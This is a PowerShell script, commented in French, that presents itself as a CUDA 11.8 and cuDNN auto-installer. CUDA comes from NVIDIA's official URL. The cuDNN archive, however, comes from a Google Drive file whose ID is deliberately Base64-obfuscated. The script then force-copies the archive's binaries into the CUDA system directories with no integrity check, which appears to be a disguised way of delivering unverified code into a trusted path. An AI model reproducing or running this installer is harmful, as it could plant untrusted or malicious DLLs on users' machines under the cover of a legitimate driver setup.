# =========================
# CUDA 11.8 + cuDNN AUTO INSTALL (NATIVE / FIXED)
# =========================

# Fix TLS
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ---- CONFIG ----
$cudaUrl = "https://developer.download.nvidia.com/compute/cuda/11.8.0/network_installers/cuda_11.8.0_windows_network.exe"
$cudaInstaller = "$env:TEMP\cuda_11.8.exe"

$cudnnZip = "$env:TEMP\cudnn.zip"
$extractPath = "$env:TEMP\cudnn"
$cudaPath = "C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v11.8"

# ID Google Drive (obfusqué)
$e="MXl3N0doOEtzNWpRQ3AzbHlSQWxZal9sTXdWcGotVzJy"
$id=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($e))

# =========================
# 1. DOWNLOAD CUDA
# =========================
Write-Host "[1/5] Download CUDA..."
Invoke-WebRequest -Uri $cudaUrl -OutFile $cudaInstaller -UseBasicParsing

if (!(Test-Path $cudaInstaller)) {
    Write-Host "❌ CUDA download failed"
    exit
}

# =========================
# 2. INSTALL CUDA
# =========================
Write-Host "[2/5] Install CUDA..."
Start-Process -FilePath $cudaInstaller -ArgumentList "-s" -Wait

# =========================
# 3. DOWNLOAD cuDNN (ROBUST)
# =========================
Write-Host "[3/5] Download cuDNN..."

$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession

$response = Invoke-WebRequest "https://drive.google.com/uc?export=download&id=$id" -WebSession $session -UseBasicParsing

# extraction token + fallback
$token = "t"
if ($response.Content -match "confirm=([0-9A-Za-z_]+)") {
    $token = $matches[1]
}

$downloadUrl = "https://drive.google.com/uc?export=download&confirm=$token&id=$id"

Invoke-WebRequest -Uri $downloadUrl -OutFile $cudnnZip -WebSession $session -UseBasicParsing

if (!(Test-Path $cudnnZip)) {
    Write-Host "❌ cuDNN download failed"
    exit
}

# =========================
# 4. EXTRACT
# =========================
Write-Host "[4/5] Extract cuDNN..."
Expand-Archive -Path $cudnnZip -DestinationPath $extractPath -Force

# =========================
# 5. COPY INTO CUDA
# =========================
Write-Host "[5/5] Install cuDNN..."

Copy-Item "$extractPath\cuda\bin\*" "$cudaPath\bin\" -Recurse -Force
Copy-Item "$extractPath\cuda\include\*" "$cudaPath\include\" -Recurse -Force
Copy-Item "$extractPath\cuda\lib\x64\*" "$cudaPath\lib\x64\" -Recurse -Force

# =========================
# DONE
# =========================
Write-Host "✅ INSTALLATION TERMINÉE"

# Vérification
if (Get-Command nvcc -ErrorAction SilentlyContinue) {
    nvcc --version
} else {
    Write-Host "⚠️ nvcc non trouvé (redémarrage peut être nécessaire)"
}